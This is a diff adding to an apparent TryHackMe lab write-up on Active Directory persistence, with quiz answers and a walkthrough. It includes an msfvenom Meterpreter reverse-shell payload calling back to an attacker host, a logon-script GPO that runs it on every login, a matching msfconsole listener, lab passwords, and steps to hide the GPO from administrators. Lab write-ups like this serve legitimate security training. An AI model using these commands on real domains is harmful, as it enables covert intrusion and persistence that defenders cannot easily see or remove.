@@ -1231,9 +1231,132 @@ By performing these steps, we can ensure that even with the highest level of per
 
 * What MMC snap-in can be used to manage GPOs?
 
+	`Group Policy Management`
+
 * What sub-GPO is used to grant users and groups access to local groups on the hosts that the GPO applies to?
+	
+	`Restricted groups`
 
 * What tab is used to modify the security permissions that users and groups have on the GPO?
+
+	`Delegation`
+
+* Practical Domain Persistence with Logon Scripts
+
+	* Create a basic executable shell 
+	
+		```
+		msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=5555 -f exe > kakakseram_shell.exe
+		```
+
+		![task8-msfvenom](./images/task8-msfvenom.png)
+
+	* Create script `kakakseram_script.bat`
+	
+		```
+		copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\kakakseram_shell.exe C:\tmp\kakakseram_shell.exe && timeout /t 20 && C:\tmp\kakakseram_shell.exe
+		```
+
+		![task8-ls](./images/task8-ls.png)
+
+	* Copy our shell & script to THMDC
+	
+		```
+		scp kakakseram_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
+		scp kakakseram_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
+		```
+
+		![task8-scp](./images/task8-scp.png)
+
+	* Login RDP to THMWRK1 
+	
+		```
+		xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'Administrator' /p:'tryhackmewouldnotguess1@'
+		```
+
+		![task8-rdp](./images/task8-rdp.png)
+
+	* Open `mmc` and add snap-in Group Policy Management
+	
+		![task8-gpo](./images/task8-gpo.png)
+
+	* Create a GPO `kakakseram - persisting GPO` under Admins
+	
+		![task8-gpo-create](./images/task8-gpo-create.png)
+
+	* Right-click on your policy and select Enforced
+	
+		![task8-enforced](./images/task8-enforced.png)
+
+	* Right-click on your policy and select Edit
+	
+		![task8-gpo-edit](./images/task8-gpo-edit.png)
+
+	* Edit Logon Propertie
+	
+		![task8-gpo-logon](./images/task8-gpo-logon.png)
+
+	* Navigate to where we stored our script and shell files
+	
+		```
+		\\thmdc.za.tryhackme.loc\SYSVOL\za.tryhackme.loc\scripts\kakakseram_script.bat
+		```
+
+		![task8-store](./images/task8-store.png)
+
+		![task8-logon-script](./images/task8-logon-script.png)
+
+		![task8-logon-shell](./images/task8-logon-shell.png)
+
+	* Reset user admin password `(t1_jay.wilson)`
+		
+		![task8-reset](./images/task8-reset.png)
+
+	* Start our MSF listener
+	
+		```
+		msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 5555; exploit"
+		```
+
+		![task8-listener](./images/task8-listener.png)
+
+	* Test it out by RDPing into THMSERVER1 with user `t1_jay.wilson`
+	
+		```
+		xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'t1_jay.wilson' /p:'Password123'
+		```
+
+		![task8-rdp2](./images/task8-rdp2.png)
+
+	* Get the shell
+	
+		![task8-shell](./images/task8-shell.png)
+
+* Practical Hiding in Plain Sigh GPO
+
+	* Set ENTERPRISE DOMAIN CONTROLLERS to Edit settings, delete, modify security
+	
+		![task8-enterprise](./images/task8-enterprise.png)
+
+	* Remove all other groups (except Authenticated Users)
+	
+		![task8-delegation](./images/task8-delegation.png)
+
+	* Click on Advanced and remove the Created Owner from the permissions
+	
+		![task8-advanced](./images/task8-advanced.png)
+
+		![task8-creator](./images/task8-creator.png)
+
+	* Add Domain Computers so that they can read the policy and pull the script
+	
+		![task8-domain-computer](./images/task8-domain-computer.png)
+
+	* Finally, Remove Authenticated Users from the policy. This will result in absolutely no person (even you) being able to view/edit the policy you created. The only way to remove it now would be to impersonate the Domain Controller's machine account.
+	
+		![task8-remove-auth](./images/task8-remove-auth.png)
+
+		![task8-hide](./images/task8-hide.png)
 
 ## Task 9 - Conclusion
 
